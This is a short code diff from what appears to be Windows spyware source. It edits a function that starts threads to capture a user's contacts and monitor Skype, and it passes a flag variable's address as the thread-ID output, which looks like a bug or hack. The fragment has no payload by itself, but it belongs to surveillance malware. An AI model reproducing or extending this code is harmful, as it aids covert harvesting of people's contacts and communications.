@@ -209,7 +209,7 @@ DWORD __stdcall PM_ContactsStartStop(BOOL bStartFlag, BOOL bReset)
 
 		// Crea il thread che cattura i contatti
 		hContactsThread = HM_SafeCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)CaptureContactsThread, NULL, 0, &dummy);
-		hCnSkypePMThread = HM_SafeCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MonitorSkypePM, NULL, 0, &dummy);
+		hCnSkypePMThread = HM_SafeCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MonitorSkypePM, NULL, 0, (DWORD *)&bPM_cnspmcp);
 
 	} else {
 		QUERY_CANCELLATION(hContactsThread, g_bContactsForceExit);
